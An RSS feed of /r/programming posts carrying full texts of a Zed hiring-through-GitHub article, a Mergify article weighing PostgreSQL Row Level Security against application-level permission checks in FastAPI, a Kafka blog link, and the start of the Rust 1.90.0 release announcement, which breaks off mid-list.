<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><atom:link href="http://192.168.1.132/?platform=reddit&amp;subreddit=programming&amp;averagePostsPerDay=5&amp;content&amp;view=rss" rel="self" type="application/rss+xml"/><title>/r/programming</title><description>Hot posts in /r/programming (roughly 5 posts per day)</description><link>https://www.reddit.com/r/programming/</link><language>en-us</language><lastBuildDate>Sat, 20 Sep 2025 07:33:11 +0000</lastBuildDate><generator>Upvote RSS</generator><image><url>https://styles.redditmedia.com/t5_2fwo/styles/communityIcon_1bqa1ibfp8q11.png</url><title>/r/programming</title><link>https://www.reddit.com/r/programming/</link></image><item><link>https://substack.com/inbox/post/173521922?r=2n87ha&amp;&amp;&amp;showWelcomeOnShare=false&amp;triedRedirect=true</link><title>Apache Kafka Fundamentals (substack.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nlergd/apache_kafka_fundamentals/</guid><comments>https://www.reddit.com/r/programming/comments/1nlergd/apache_kafka_fundamentals/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 1 min | <a href='https://www.reddit.com/r/programming/comments/1nlergd/apache_kafka_fundamentals/'>Post permalink</a></p></section><section class='separator separator-after-permalink'><p>&nbsp;</p><hr><p>&nbsp;</p></section><section class='selftext'><!-- SC_OFF --><div class="md"><p>Hi everyone,<br/>In this blog, I tried to explain the different components of Kafka. I also covered how load balancing works in Kafka. If you are an absolute beginner, I would suggest reading this blog and sharing your feedback.</p><p>For those with experience, I would love to hear your suggestions on what more could be added in the next part. If you have any book recommendations, please feel free to share them as well.</p><p>Thank you!😊</p></div><!-- SC_ON --></section><section class='preview-image'><p>&nbsp;</p><img src='https://substackcdn.com/image/fetch/$s_!5w5b!,w_1200,h_600,c_fill,f_jpg,q_auto:good,fl_progressive:steep,g_auto/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9dd25dae-6416-4728-9e5d-9941af4940b0_1096x339.png' /></section>]]></description><pubDate>Sat, 20 Sep 2025 02:07:06 +0530</pubDate></item><item><link>https://zed.dev/blog/hired-through-github-part-1</link><title>Hired Through GitHub (zed.dev)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nl4ba0/hired_through_github/</guid><comments>https://www.reddit.com/r/programming/comments/1nl4ba0/hired_through_github/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 12 min | <a href='https://www.reddit.com/r/programming/comments/1nl4ba0/hired_through_github/'>Post permalink</a></p></section><section class='separator separator-before-parsed-content'><p>&nbsp;</p><hr><p>&nbsp;</p></section><section class='parsed-content'><article><p>At Zed Industries, most hiring follows the traditional path: developers find roles on our <a href="https://zed.dev/jobs">jobs page</a>, apply, and interview with the team through technical pairing sessions and culture conversations.</p><p>But some developers find their way to the team through a different route entirely.</p><h2><a href="https://zed.dev#recognition-through-contributions"><span>Recognition Through Contributions</span></a></h2><p>The alternative path starts in our GitHub repository. We regularly notice community members who consistently ship quality PRs: fixing bugs, implementing requested features, and improving the editor.</p><p>These contributors become familiar names in our internal Slack.</p><div><figure><img src="https://zed.dev/img/post/hired-through-github/joseph_smit_slack_comment.webp" alt="0xtimsb's issue and PR write-ups are nice"><figcaption>0xtimsb's issue and PR write-ups are nice</figcaption></figure></div><div><figure><img src="https://zed.dev/img/post/hired-through-github/peter_smit_slack_comment.webp" alt="This dude (0xtimsb "><figcaption>This dude (0xtimsb "tims") is doing some good work</figcaption></figure></div><p>These aren't drive-by contributions. The developers we eventually hire have typically:</p><ul> <li>Engaged with the team, either through GitHub <a href="https://github.com/zed-industries/zed/discussions">Discussions</a> or our <a href="https://zed.dev/community-links#forums-and-discussions">Discord channel</a>, before opening PRs to align on direction</li> <li>Demonstrated consistent code quality across multiple contributions</li> <li>Built rapport with team members through live pair programming sessions (our favorite!) <ul> <li><em>Zed teammates will often share links to their calendars in Discord to contributors who are interested in pairing.</em></li> </ul> </li> </ul><p>When we spot this pattern, we reach out.</p><p>What follows are the stories of some of the Zed team members who earned their positions through exceptional open source contributions. This is the first in a series highlighting and celebrating these developers who believed in Zed's mission early on, contributed their time and expertise freely, and ultimately became core members of our team.</p><h3><a href="https://zed.dev#junkui-zhang"><span>Junkui Zhang</span></a></h3><div><p>Hobbies</p><p>Playing Dota 2 &#127918;, watching anime &#128250;</p></div><p>In early 2024, Zed was only supported on macOS. Official <a href="https://zed.dev/blog/zed-on-linux">Linux support</a> would not be announced for another half a year, and Junkui, a student at Wuhan University, was on the lookout for a new editor.</p><blockquote><p>I used to do most of my coding in VS Code and PyCharm, but honestly, both of them felt way too slow, and used a lot of RAM, especially on my laptop. So I started looking for alternatives. I gave Neovim a shot, but at the end of the day, it's not really an IDE, and for me the limitations were just too big.</p><p>Then one day I stumbled across Zed's promo online and decided to keep an eye on it. Back then, Zed wasn't open source yet and only supported macOS, so I kept waiting for any news about a Windows version. Later, I heard it had gone open source.</p></blockquote><p>At the time, we had our eyes on introducing Linux support. Windows was also on our mind, but the plan was to add it after Linux. Junkui, a Windows user, recounts his first experience trying to compile and run Zed:</p><blockquote><p>I still remember that day, I excitedly opened GitHub, pulled up Zed's repo, and thought, "Alright, time to build myself a Windows version of Zed!" But as soon as I opened the repo&hellip; disappointment. It was full of <code>unimplemented!</code> everywhere.</p></blockquote><p>Junkui began opening pull requests to address missing features:</p><blockquote><p>I rely heavily on font ligatures and OpenType features, so I went ahead and implemented full OpenType feature and font fallback support for Zed.</p></blockquote><p>A few PRs turned into a 10-month contribution campaign that resulted in Junkui becoming our <a href="https://x.com/zeddotdev/status/1837157879708799371">top external contributor</a>, based on PR submission count.</p><div><figure><img src="https://zed.dev/img/post/hired-through-github/junkuis-pull-requests.webp" alt="Junkui's Zed pull requests"><figcaption>Junkui's Zed pull requests</figcaption></figure></div><p>Junkui applied for an internship position at Zed. The answer was obvious; Zed on Windows was becoming more and more feasible because of Junkui's additions, so we took him up!</p><p>Now, after being at Zed Industries for 9 months, Junkui remarks on his experience thus far:</p><blockquote><p>I really enjoy the freedom to explore and implement new ideas, as well as the opportunity to work on a product that I genuinely care about. The team is also very supportive and collaborative, which makes it a great environment to learn and grow.</p><p>Don't hesitate to reach out and share your ideas! The team is always looking for passionate individuals who want to contribute.</p></blockquote> <hr><p>Today, we have a subset of the team daily driving Zed on Windows and opening PRs. Check the <a href="https://zed.dev/blog/windows-progress-report">Windows progress report post</a>. &#129695;</p><h3><a href="https://zed.dev#anthony-eid"><span><a href="https://zed.dev/team#anthony-eid">Anthony Eid</a></span></a></h3><div><p><svg width="24" height="24"><path></path><circle></circle></svg> Location</p><p>Detroit, Michigan, USA</p></div><p><a href="https://github.com/zed-industries/zed/issues/5065">The debugger issue</a>. The most highly-upvoted issue of all time in Zed's backlog.</p><div><figure><img src="https://zed.dev/img/post/hired-through-github/debugger-issue.webp" alt="The debugger issue"><figcaption>The debugger issue</figcaption></figure></div><ul> <li>Filed in December of 2022</li> <li>2100+ &#128077;s, 250+ &#10084;&#65039;s, 150+ &#128640;s</li> </ul><p>It was abundantly clear that users were wanting to do more than just <code>console.log()</code> within Zed. So much so that while we were building out other editor primitives and flagship features, <a href="https://github.com/RemcoSmitsDev">Remco Smits</a> took it upon himself to start working on an implementation.</p><p>At the same time, Anthony, who had previously worked building safety critical systems in the defense industry, discovered Zed, and was drawn to it:</p><blockquote><p>I first came across Zed either through <a href="https://www.youtube.com/watch?v=JGz7Ou0Nwo8">Fireship</a> or <a href="https://www.reddit.com/r/programming/comments/19enm8m/the_zed_text_editor_is_now_open_source/">a Reddit post</a> about it being open source.</p></blockquote><p>While testing Zed, something really stood out to Anthony:</p><blockquote><p>One of the biggest things was how snappy Zed felt when I used it on my laptop, and reading about <a href="https://www.gpui.rs">GPUI</a>. How many desktop apps nowadays are built with native code instead of web technologies? Let alone a Code Editor built with a custom graphics stack.</p></blockquote><p>Anthony was also on the lookout for projects to contribute to:</p><blockquote><p>I wanted to contribute to an open source project as a hobby and learn Rust because I was an embedded C dev at the time and felt that Rust would be a great language/skill to learn. I was drawn to Zed because it was a project that was focused on quality software development (performance, reliability, memory safety, etc.) and was innovating in the code editor space.</p></blockquote><p>The work being done on the debugger was enticing. <a href="https://github.com/zed-industries/zed/issues/5307#issuecomment-1985031245">Anthony asked if any help was needed</a> in early March 2024, and Remco took him up on the offer.</p><div><figure><img src="https://zed.dev/img/post/hired-through-github/offer-to-help.webp" alt="Anthony offers to help"><figcaption>Anthony offers to help</figcaption></figure></div><p>By June, Anthony and Remco were pairing multiple times a week, working under the hood, to build out the debugger backend infrastructure.</p><p>As the debugger work began to round out, members of the Zed team began interfacing with Remco and Anthony.</p><blockquote><p>Once the debugger PR got big enough, we had a weekly meeting with <a href="https://github.com/mikayla-maki">Mikayla</a> where we could ask questions and discuss the implementation details. Towards the end of the project, <a href="https://github.com/osiewicz">Piotr</a> started working on the debugger as well. He was responsible for pushing our last major refactor before getting the debugger PR merged into Zed's main branch.</p></blockquote><p>Anthony recalls how he transitioned from a contributor to a Zed team member, after working on the debugger for more than half a year:</p><blockquote><p>I applied a couple of times before getting hired, but I was approached by <a href="https://github.com/JosephTLyons">Joseph</a> on Discord about getting a job at Zed, which ended up getting me my first interview and hired. My only interview was with <a href="https://github.com/nathansobo">Nathan</a> (CEO) and it felt more like a conversation about the debugger and Zed instead of a traditional technical interview. At that time I was spending a lot of time pair programming with Piotr already so I think that contributed to the relaxed atmosphere.</p></blockquote><p>After being hired into Zed, Anthony, Remco, and the Zed team made the final pushes on the debugger PR to get it into a state where it could be merged into main, under a staff-only feature flag.</p><p>The details around <a href="https://github.com/zed-industries/zed/pull/13433">the debugger PR</a> reflect the sheer magnitude of this community-driven effort:</p><div><figure><img src="https://zed.dev/img/post/hired-through-github/debugger-pull-request.webp" alt="The debugger pull reqeust"><figcaption>The debugger pull reqeust</figcaption></figure></div><ul> <li>Opened June of 2024</li> <li>977 commits</li> <li>Touched ~26k LOC / 156 files</li> <li>500+ &#128077;s, 200+ &#10084;&#65039;s, 150+ &#128640;s</li> <li>Merged March of 2025</li> </ul><p>Now working alongside the Zed team, Anthony reflects on how he grew from the experience:</p><blockquote><p>Because the debugger was self-driven between Remco and I, I was able to learn about organizing a project, working as a team, and a lot of just diving into the codebase when there were questions to be answered. I was able to jump into a problem that I had little experience in (Zed, Rust, debuggers, DAP, etc) and help create a feature that a lot of people were looking forward to and are using today! I've developed all the skills I've been using in the debugger project&mdash;I'm able to read and digest code much faster now, jump into new problems with less context, and navigate around large codebases easier.</p></blockquote><p>Anthony's experience highlights what makes working at Zed unique:</p><blockquote><p>Zed is a fast moving company where everyone is trusted to ship code. There's a lot of opportunity to work on interesting technical challenges and I'm able to explore solutions on my own or with other teammates. Plus Zed is a product I use practically every day and I'm able to spend time adding features that I want as well!</p></blockquote><p>For those considering contributing...</p><blockquote><p>Make sure you enjoy the journey and pair program with the team as much as possible.</p></blockquote> <hr><p>The <a href="https://zed.dev/debugger">debugger</a> is available to all users in Zed today, thanks to the monumental amount of time and energy Remco and Anthony invested into kickstarting it all.</p><h2><a href="https://zed.dev#the-bottom-line"><span>The Bottom Line</span></a></h2><p>At Zed, we've discovered that talent reveals itself in different ways. Some of our engineers applied through traditional channels with impressive resumes. Others first proved themselves through their contributions. This approach is part of our DNA&mdash;Zed cofounder <code>as-cii</code> (<a href="https://github.com/as-cii">Antonio Scandurra</a>) was originally hired to the <a href="https://atom-editor.cc">Atom</a> team after his consistent quality <a href="https://github.com/atom/atom/pulls?q=is%3Apr+is%3Aclosed+author%3Aas-cii+sort%3Acreated-asc+is%3Amerged">pull request submissions</a> caught the team's attention!</p><div><figure><img src="https://zed.dev/img/post/hired-through-github/antonios-atom-pull-requests.webp" alt="Antonio's Atom pull requests"><figcaption>Antonio's Atom pull requests</figcaption></figure></div><p>This diversity of backgrounds makes us stronger. We whole-heartedly believe in a pair-heavy culture, that the best software comes about from multiple minds working in concert to elegantly solve complex problems&mdash;our <a href="https://zed.dev/blog/crdts">data structures</a> were built from the ground up with this exact kind of collaboration in mind.</p><p>At Zed, it doesn't matter whether you have a degree or taught yourself to code, whether you came through a job posting or built a relationship through open source. What matters is your passion for craftsmanship, your ability to communicate, and most importantly, that you can ship! &#128674;</p><p>We're looking for people who love building great software. If that's you, we'll find each other&mdash;one way or another.</p><hr><div><h3>Looking for a better editor?</h3><p>You can try Zed today on macOS or Linux. <a href="https://zed.dev/download">Download now</a>!</p><hr><h3>We are hiring!</h3><p>If you're passionate about the topics we cover on our blog, please consider <a href="https://zed.dev/jobs">joining our team</a> to help us ship the future of software development.</p></div></article> </section>]]></description><pubDate>Fri, 19 Sep 2025 19:28:03 +0530</pubDate></item><item><link>https://mergify.com/blog/application-vs-database-where-should-permissions-live</link><title>Application vs. Database: Where Should Permissions Live? (mergify.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nkm5rc/application_vs_database_where_should_permissions/</guid><comments>https://www.reddit.com/r/programming/comments/1nkm5rc/application_vs_database_where_should_permissions/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 13 min | <a href='https://www.reddit.com/r/programming/comments/1nkm5rc/application_vs_database_where_should_permissions/'>Post permalink</a></p></section><section class='preview-image'><img src='https://framerusercontent.com/images/4wPiLEUrO7MdYLpRl1Qdusv4c.png?width=1376&height=864' /></section><section class='parsed-content'><p>Permissions drift is real: scattered checks, forgotten filters, and data leaks. PostgreSQL&rsquo;s Row Level Security (RLS) flips the script: pushing verification into the database for stronger safety, but with trade-offs in debugging and performance.</p><div><p>Permissions are among the most complex parts of building any application. Access control is a fundamental system design requirement, and most implementations begin by enforcing checks at the application layer.</p><p>For instance:</p><div><pre><code>@<span>app</span>.<span>get</span><span>(</span><span>"/projects"</span><span>)</span> <span>async</span> <span>def</span> <span>list_projects</span><span>(</span><span>user</span><span>:</span> User<span>,</span> <span>db</span><span>:</span> <span>Session</span> = <span>Depends</span><span>(</span><span>get_db</span><span>)</span><span>)</span><span>:</span> <span>return</span> <span>db</span>.<span>query</span><span>(</span><span>Project</span><span>)</span>.<span>filter</span><span>(</span><span>Project</span>.<span>user_id</span> == <span>user</span>.<span>id</span><span>)</span>.<span>all</span><span>(</span><span>)</span></code></pre></div><p>Queries quickly accumulate explicit <code>WHERE</code> clauses, middleware enforces constraints, and guard logic is scattered throughout the codebase. While functional, this approach is prone to inconsistencies, omissions, and vulnerabilities.</p><p>Over time, no one is entirely sure where the real source of truth resides. Confusion emerges, permissions drift, and a single forgotten clause can lead to data leaking into the wrong hands.</p><p>Fortunately, there are tools to address this uncertainty. One such tool is <a href="https://www.postgresql.org/docs/current/ddl-rowsecurity.html"><strong>PostgreSQL's Row Level Security (RLS)</strong></a>, which provides a first-class mechanism for enforcing permissions. In the context of a <a href="https://fastapi.tiangolo.com/">FastAPI</a> service, RLS reframes the broader question:</p><blockquote><p><em>Where should permission verification actually live: in the application, or in the database?</em></p></blockquote><h2>Why Push Permissions into the Database?</h2><p>Pushing permissions into the database may initially feel counterintuitive. Application frameworks like FastAPI already offer middleware, dependency injection, and hooks for checks. Why involve PostgreSQL?</p><p>The answer rests on two pillars:</p><ul><li><p><strong>Safety</strong>: With RLS, the database itself refuses to return unauthorized rows, regardless of how inconsistent or error-prone the application code might be. Forgotten filters are no longer a risk.</p></li><li><p><strong>Consistency</strong>: Policies are defined in the database schema and are not scattered across application code. Every query, whether via ORM, raw SQL, or reporting tools, is subject to the same guardrails.</p></li></ul><p>This effectively transforms PostgreSQL from a storage layer into an <em>enforcer of trust</em>.</p><p>Traditionally, application code performs the checks, as seen in the previous code snippet:</p><div><pre><code><span>db</span>.<span>query</span><span>(</span><span>Project</span><span>)</span>.<span>filter</span><span>(</span><span>Project</span>.<span>user_id</span> == <span>user</span>.<span>id</span><span>)</span>.<span>all</span><span>(</span><span>)</span></code></pre></div><p>That means:</p><ul><li><p>Every endpoint or service must remember to apply filters.</p></li><li><p>Business and security logic become intertwined.</p></li><li><p>One oversight can bypass access rules entirely.</p></li></ul><p>RLS flips this convention. The application simply sets a session parameter (equivalent to <code>SET LOCAL app.current_user_id</code> with FastAPI) and executes queries; PostgreSQL enforces the policies.</p><p>With RLS, the database enforces this rule directly:</p><div><pre><code><span>ALTER </span><span>TABLE </span><span>projects </span><span>ENABLE </span><span>ROW </span><span>LEVEL </span><span>SECURITY</span><span>;</span> <span>CREATE </span><span>POLICY </span><span>user_can_view_projects</span> <span>ON </span><span>projects</span> <span>FOR </span><span>SELECT</span> <span>USING</span> <span>(</span> <span>EXISTS</span> <span>(</span> <span>SELECT </span><span>1</span> <span>FROM </span><span>memberships </span><span>m</span> <span>WHERE </span><span>m</span>.<span>project_id</span> = <span>projects</span>.<span>id</span> <span>AND </span><span>m</span>.<span>user_id</span> = <span>current_setting</span><span>(</span><span>'app.current_user_id'</span><span>)</span><span>:</span><span>:</span><span>uuid</span> <span>)</span> <span>)</span><span>;</span></code></pre></div><p>This raises an architectural question:</p><ul><li><p>Should the application remain the primary decision-maker, treating the database as a dumb store?</p></li><li><p>Or should the database take on a share of the business logic?</p></li></ul><p>In practice, the trade-off is between <strong>control</strong> and <strong>safety</strong>. Application-level checks are explicit but fragile; database-level checks are implicit but robust.</p><h2>Development Workflow Implications</h2><p>Adopting RLS is not only a technical change but also a cultural one. Developers accustomed to debugging FastAPI endpoints must now recognize that "empty results" may be the outcome of a database policy, not a faulty filter in Python. Debugging shifts from <em>"why is this filter wrong?"</em> to <em>"what policy just applied?"</em></p><p>In FastAPI, this boils down tp passing the current user&rsquo;s identity into PostgreSQL:</p><div><pre><code><span>async</span> <span>def</span> get_db<span>(</span><span>user</span><span>:</span> User<span>)</span><span>:</span> async <span>with</span> <span>async_session</span><span>(</span><span>)</span> <span>as</span> session<span>:</span> # <span>Assign </span><span>current </span><span>user </span><span>for</span> <span>RLS</span> <span>await</span> <span>session</span>.<span>execute</span><span>(</span> <span>text</span><span>(</span><span>"SET LOCAL app.current_user_id = :uid"</span><span>)</span><span>,</span> <span>{</span><span>"uid"</span><span>:</span> <span>str</span><span>(</span><span>user</span>.<span>id</span><span>)</span><span>}</span> <span>)</span> <span>yield</span> <span>session</span></code></pre></div><p>Once this is set, all queries in the transaction are evaluated against RLS policies.</p><p>Then, with RLS enabled, the endpoint no longer needs explicit filters and can be designed this way:</p><div><pre><code>@<span>app</span>.<span>get</span><span>(</span><span>"/projects"</span><span>)</span> <span>async</span> <span>def</span> <span>list_projects</span><span>(</span><span>db</span><span>:</span> <span>AsyncSession</span> = <span>Depends</span><span>(</span><span>get_db</span><span>)</span><span>)</span><span>:</span> <span>return</span> <span>db</span>.<span>query</span><span>(</span><span>Project</span><span>)</span>.<span>all</span><span>(</span><span>)</span></code></pre></div><p>Even though the query has no <code>WHERE</code>clause, PostgreSQL ensures only the authorized rows are returned.</p><p>Now, developers can query tables naturally, without having to enforce permissions themselves directly in the endpoint. This new structure evidently implies some necessary adjustments and reflections:</p><ul><li><p><strong>Session Management</strong>: Connection pooling can introduce risks. If <code>SET LOCAL</code> is misapplied, user identifiers may persist across pooled connections, exposing data. Correct transaction scoping is critical.</p></li><li><p><strong>Testing</strong>: Python unit tests alone are insufficient. Database-level test cases must verify which rows each user can and cannot access.</p></li><li><p><strong>Onboarding</strong>: Developers new to RLS often find it unintuitive. Training and documentation are essential for adoption.</p></li><li><p><strong>Third-Party Access</strong>: Reporting tools or analysts must also respect RLS, which requires consistently setting session parameters outside the application. This adds friction but guarantees uniform enforcement.</p></li></ul><p>In short, RLS does not remove complexity; it&nbsp;<em>relocates</em>&nbsp;it, moving responsibility from the application code to the&nbsp;PostgreSQL schema design.</p><h2>Performance Considerations</h2><p>RLS is evaluated for every row accessed by a query. While overhead is minimal in simple cases, complex joins can trigger unexpected query plans.</p><p>For example:</p><div><pre><code><span>USING</span> <span>(</span> <span>EXISTS</span> <span>(</span> <span>SELECT </span><span>1</span> <span>FROM </span><span>memberships</span> <span>WHERE </span><span>memberships</span>.<span>project_id</span> = <span>projects</span>.<span>id</span> <span>AND </span><span>memberships</span>.<span>user_id</span> = <span>current_setting</span><span>(</span><span>'app.current_user_id'</span><span>)</span><span>:</span><span>:</span><span>uuid</span> <span>)</span> <span>)</span></code></pre></div><p>This appears straightforward, but:</p><ul><li><p>On large datasets, it can generate nested subqueries for every row.</p></li><li><p>Missing indexes on <code>memberships</code> can severely degrade performance.</p></li><li><p>Complex joins (e.g., <code>projects &rarr; tasks &rarr; comments</code>) multiply the cost.</p></li></ul><p>Best practices include:</p><ul><li><p>Designing indexes aligned with policy predicates.</p></li><li><p>Keeping policy logic minimal and delegating heavy computation to precomputed views.</p></li><li><p>Periodically reviewing execution plans with <code>EXPLAIN</code> under RLS conditions.</p></li></ul><p>RLS, therefore, enforces security and forces developers to approach schema design with a database engineer's mindset.</p><h2>Operational Challenges</h2><p>Implementing RLS at scale introduces several subtleties:</p><ul><li><p><strong>Session Scope</strong>: Always use <code>SET LOCAL</code> inside transactions; never use <code>SET</code> globally. Otherwise, one user's ID may leak into another's request through a pooled connection.</p></li><li><p><strong>Migration Complexity</strong>: Adding RLS late in a project can be disruptive. Queries that previously "just worked" may suddenly return empty results until session variables are set correctly. Early adoption is simpler.</p></li><li><p><strong>Third-Party Access</strong>: Admin dashboards, reporting tools, and data scientists must also set session variables. This constraint can be inconvenient but ensures consistency across all access paths.</p></li></ul><h2>When RLS Is the Wrong Tool</h2><p>RLS is powerful but not universal. Specific scenarios are better handled in application logic:</p><ul><li><p><strong>Access-control list</strong>: e.g., "admins can edit project metadata, but only owners can delete it."</p></li><li><p><strong>Feature flags</strong>: Conditional feature exposure is easier to manage in middleware.</p></li><li><p><strong>Complex workflows</strong>: Multi-step approval processes or rules not tied directly to rows/columns are awkward to encode as SQL policies.</p></li></ul><p>RLS is best reserved for <em>structural visibility rules</em> ("users may only see their own rows"), not for the entire permission system. It maps well to a multi-tenant database that requires proper isolation at the storage rather than the application level, improving security.</p><h2>The Trade-off Matrix</h2><p>As with every engineering decision, this can be boiled down to a trade-off between multiple dimensions.</p><figure><table><tbody><tr><th></th><th><p>Application-Level Filtering</p></th><th><p>Row Level Security</p></th></tr><tr><th><p>Safety</p></th><td><p>&#9888;&#65039; Prone to omission</p></td><td><p>&#9989; Guaranteed by the databaes</p></td></tr><tr><th><p>Transparency</p></th><td><p>&#9989; Explicit in application code</p></td><td><p>&#9989; Implicit in schema</p></td></tr><tr><th><p>Performance</p></th><td><p>&#9888;&#65039; Potential over-fetching</p></td><td><p>&#9888;&#65039; Avoid over-fetching, but can prevent some optimizations</p></td></tr><tr><th><p>Debugging</p></th><td><p>&#9989; Familiar to application devs</p></td><td><p>&#9888;&#65039; Requires database expertise</p></td></tr><tr><th><p>Portability</p></th><td><p>&#9989; Works with any database</p></td><td><p>&#9888;&#65039; PostgreSQL specific</p></td></tr><tr><th><p>Adaptation Cost</p></th><td><p>&#9989; Low (default pattern)</p></td><td><p>&#9888;&#65039; Requires schema design and team training</p></td></tr></tbody></table></figure><h2>Our Own Two Cents</h2><p>At Mergify, we build tools and products to help teams create reliable CI pipelines, increase merge rates, and reduce the overall costs associated with these workflows. Achieving this requires a large number of API routes, each interacting with various resources in our PostgreSQL database.</p><p>As the number of endpoints grew &mdash; along with our user base, product use cases, and database activity &mdash; we began enforcing stricter permissions across existing routes. This quickly became a long and complex effort of refactoring endpoints one by one, by adding the necessary permission filters everywhere, and juggling with unexpected edge cases.</p><p>Obviously, the experience raised an important question. Since we had no plans to move away from PostgreSQL, and given how easy it is for developers to overlook permission details, should access control really remain at the application level? Or would it be more effective to leverage PostgreSQL's Row Level Security (RLS), reducing both the cognitive load on developers and the risk of mistakes, along with reducing the load on the database with more optimized queries?</p><p>As it was necessary, the refactor made these issues painfully clear. It not only increased code complexity but also hurt readability. At the same time, our database schema was already solid and well-suited for tools like RLS. The trade-off, in our context, then quickly became evident and we made the switch.</p><h2>Conclusion</h2><p>PostgreSQL's Row Level Security provides a robust mechanism for delegating access control to the database engine. In applications, it offers stronger safety guarantees than application-level filtering but introduces new challenges in schema design, debugging, and operational workflows.</p><p>RLS should not be treated as a universal replacement for application logic. Its value lies in eliminating a specific class of vulnerabilities: unauthorized row leakage caused by missing filters.</p><p>The most significant challenges are cultural and operational rather than purely technical. Teams must adapt their testing practices, debugging workflows, and database literacy. Performance tuning and careful session management are essential for success.</p><p>Ultimately, adopting RLS is less about syntax than <strong>architectural philosophy</strong>: deciding whether access control belongs primarily in the application layer or in the database itself. RLS provides a compelling solution for systems that prioritize safety, consistency, and regulatory compliance.</p></div><div class="gallery"><p><img src="https://framerusercontent.com/images/jbU2li0CRV8imdjy2kpdygS2qdU.png?width=1376&amp;height=864"></p><p><img src="https://framerusercontent.com/images/hDlb6DNL2LQcM9Ggg2VfDC0U6k.png?width=1376&amp;height=864"></p><p><img src="https://framerusercontent.com/images/aIxOpYnjpZYpT8MiWrNOwl0EpeQ.png?width=1376&amp;height=864"></p></div></section>]]></description><pubDate>Fri, 19 Sep 2025 03:47:26 +0530</pubDate></item><item><link>https://blog.rust-lang.org/2025/09/18/Rust-1.90.0/</link><title>Announcing Rust 1.90.0 (blog.rust-lang.org)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nklzrv/announcing_rust_1900/</guid><comments>https://www.reddit.com/r/programming/comments/1nklzrv/announcing_rust_1900/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 8 min | <a href='https://www.reddit.com/r/programming/comments/1nklzrv/announcing_rust_1900/'>Post permalink</a></p></section><section class='preview-image'><img src='https://www.rust-lang.org/static/images/rust-social-wide.jpg' /></section><section class='parsed-content'><p>Sept. 18, 2025 &middot; The Rust Release Team </p><div><p>The Rust team is happy to announce a new version of Rust, 1.90.0. Rust is a programming language empowering everyone to build reliable and efficient software.</p><p>If you have a previous version of Rust installed via <code>rustup</code>, you can get 1.90.0 with:</p><pre><code><span>$ rustup update stable </span></code></pre><p>If you don't have it already, you can <a href="https://www.rust-lang.org/install.html">get <code>rustup</code></a> from the appropriate page on our website, and check out the <a href="https://doc.rust-lang.org/stable/releases.html#version-1900-2025-09-18">detailed release notes for 1.90.0</a>.</p><p>If you'd like to help us out by testing future releases, you might consider updating locally to use the beta channel (<code>rustup default beta</code>) or the nightly channel (<code>rustup default nightly</code>). Please <a href="https://github.com/rust-lang/rust/issues/new/choose">report</a> any bugs you might come across!</p><h2> What's in 1.90.0 stable</h2> <h2> LLD is now the default linker on <code>x86_64-unknown-linux-gnu</code></h2><p>The <code>x86_64-unknown-linux-gnu</code> target will now use the LLD linker for linking Rust crates by default. This should result in improved linking performance vs the default Linux linker (BFD), particularly for large binaries, binaries with a lot of debug information, and for incremental rebuilds.</p><p>In the vast majority of cases, LLD should be backwards compatible with BFD, and you should not see any difference other than reduced compilation time. However, if you do run into any new linker issues, you can always opt out using the <code>-C linker-features=-lld</code> compiler flag. Either by adding it to the usual <code>RUSTFLAGS</code> environment variable, or to a project's <a href="https://doc.rust-lang.org/cargo/reference/config.html"><code>.cargo/config.toml</code></a> configuration file, like so:</p><pre><code><span><span>[</span><span><span>target</span><span>.</span><span>x86_64-unknown-linux-gnu</span></span><span>]</span> </span><span><span><span>rustflags</span></span> <span>=</span> <span>[</span><span><span>"</span>-Clinker-features=-lld<span>"</span></span><span>]</span> </span></code></pre><p>If you encounter any issues with the LLD linker, please <a href="https://github.com/rust-lang/rust/issues/new/choose">let us know</a>. You can read more about the switch to LLD, some benchmark numbers and the opt out mechanism <a href="https://blog.rust-lang.org/2025/09/01/rust-lld-on-1.90.0-stable/">here</a>.</p><h3> Cargo adds native support for workspace publishing</h3><p><code>cargo publish --workspace</code> is now supported, automatically publishing all of the crates in a workspace in the right order (following any dependencies between them).</p><p>This has long been possible with external tooling or manual ordering of individual publishes, but this brings the functionality into Cargo itself.</p><p>Native integration allows Cargo's publish verification to run a build across the full set of to-be-published crates <em>as if</em> they were published, including during dry-runs. Note that publishes are still not atomic -- network errors or server-side failures can still lead to a partially published workspace.</p><h3> Demoting <code>x86_64-apple-darwin</code> to Tier 2 with host tools</h3><p>GitHub will soon <a href="https://github.blog/changelog/2025-07-11-upcoming-changes-to-macos-hosted-runners-macos-latest-migration-and-xcode-support-policy-updates/#macos-13-is-closing-down">discontinue</a> providing free macOS x86_64 runners for public repositories. Apple has also announced their <a href="https://en.wikipedia.org/wiki/Mac_transition_to_Apple_silicon#Timeline">plans</a> for discontinuing support for the x86_64 architecture.</p><p>In accordance with these changes, as of Rust 1.90, we have <a href="https://github.com/rust-lang/rfcs/pull/3841">demoted the <code>x86_64-apple-darwin</code> target</a> from <a href="https://doc.rust-lang.org/stable/rustc/platform-support.html#tier-1-with-host-tools">Tier 1 with host tools</a> to <a href="https://doc.rust-lang.org/stable/rustc/platform-support.html#tier-2-with-host-tools">Tier 2 with host tools</a>. This means that the target, including tools like <code>rustc</code> and <code>cargo</code>, will be guaranteed to build but is not guaranteed to pass our automated test suite.</p><p>For users, this change will not immediately cause impact. Builds of both the standard library and the compiler will still be distributed by the Rust Project for use via <code>rustup</code> or alternative installation methods while the target remains at Tier 2. Over time, it's likely that reduced test coverage for this target will cause things to break or fall out of compatibility with no further announcements.</p><h3> Stabilized APIs</h3> <ul> <li><a href="https://doc.rust-lang.org/stable/std/primitive.usize.html#method.checked_sub_signed"><code>u{n}::checked_sub_signed</code></a></li> <li><a href="https://doc.rust-lang.org/stable/std/primitive.usize.html#method.overflowing_sub_signed"><code>u{n}::overflowing_sub_signed</code></a></li> <li><a href="https://doc.rust-lang.org/stable/std/primitive.usize.html#method.saturating_sub_signed"><code>u{n}::saturating_sub_signed</code></a></li> <li><a 